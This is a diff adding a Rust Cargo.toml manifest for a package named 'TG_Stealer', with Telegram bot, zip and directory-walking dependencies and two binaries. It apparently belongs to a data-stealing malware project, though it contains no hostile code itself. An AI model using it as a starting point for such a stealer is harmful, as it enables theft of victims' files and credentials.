@@ -1,0 +1,21 @@
+[package]
+name = "TG_Stealer"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+teloxide = "0.13.0"
+tokio = { version = "1", features = ["full"] }
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+zip = "2.2.0"
+walkdir = "2.3"
+
+
+[[bin]]
+name = "configurator"
+path = "src/configurator.rs"
+
+[[bin]]
+name = "main"
+path = "src/main.rs"
